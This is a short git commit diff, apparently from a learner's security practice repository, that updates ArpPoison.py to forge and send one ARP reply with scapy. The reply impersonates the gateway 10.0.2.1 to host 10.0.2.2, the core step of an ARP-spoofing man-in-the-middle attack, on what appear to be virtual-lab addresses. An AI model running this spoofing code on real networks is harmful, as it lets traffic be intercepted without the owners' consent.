31ece6a92eef2fe895e0f9fdfa9f9d8c937e6694
OsiBK <osman_bayram-fb@hotmail.com>
2023-12-16 23:26:47 +0300

    update Arp poison

--- CyberSecurity/MITM/ArpPoison.py
+++ CyberSecurity/MITM/ArpPoison.py
@@ -1,4 +1,6 @@
 import scapy.all as scapy
 
-arp_response = scapy.ARP()
-scapy.ls(scapy.ARP())
+arpResponse = scapy.ARP(op=2,pdst="10.0.2.2", hwdst="52:54:00:12:35:00", psrc="10.0.2.1")
+scapy.send(arpResponse)
+#scapy.ls(scapy.ARP())
+
